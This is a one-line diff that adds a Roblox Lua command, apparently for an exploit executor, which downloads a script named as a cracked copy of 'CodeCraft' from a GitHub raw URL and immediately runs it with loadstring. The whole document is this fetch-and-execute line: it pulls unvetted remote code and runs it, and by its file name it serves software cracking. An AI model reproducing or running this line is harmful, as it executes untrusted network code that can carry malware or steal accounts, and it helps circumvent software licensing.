@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/BrySadW/CodeCRAFTCrack/refs/heads/main/CodeCraftCRACKED.txt'))()
